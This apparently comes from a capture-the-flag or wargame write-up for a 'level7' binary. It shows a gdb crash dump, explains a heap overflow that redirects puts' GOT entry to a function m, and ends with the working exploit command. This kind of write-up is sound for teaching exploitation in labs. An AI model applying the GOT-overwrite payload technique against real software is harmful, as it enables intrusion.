When i did this :

```
gdb) r 'aaaabbbbccccddddeeeeffffgggghhhhiiiijjjj'
Starting program: /home/user/level7/level7 'aaaabbbbccccddddeeeeffffgggghhhhiiiijjjj'

Program received signal SIGSEGV, Segmentation fault.
0xb7eb0208 in ?? () from /lib/i386-linux-gnu/libc.so.6
(gdb) i r
eax            0x66666666       1717986918
ecx            0x0      0
edx            0x66666666       1717986918
ebx            0xb7fd0ff4       -1208152076
esp            0xbffff6dc       0xbffff6dc
ebp            0xbffff708       0xbffff708
esi            0x0      0
edi            0x0      0
eip            0xb7eb0208       0xb7eb0208
eflags         0x210286 [ PF SF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
```

I noticed than eip does not get overflowed but eax and edx.

This means I have 20 bytes to overflow and that the rest will be in puVar3[1].

This way, i can overwrite the adress of puVar3[1] to be the GOT address of puts and set argv[2] to be the function m that we want to call.

This way when argv[2] is copied to puVar3[1], really the address of m is copied to the address point of puts.

And when the programm call puts, it calls m instead

In the end :
```
./level7 $(python -c 'print "B"*20+"\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
```

because "\x28\x99\x04\x08" is the address of puts and "\xf4\x84\x04\x08" is the address of m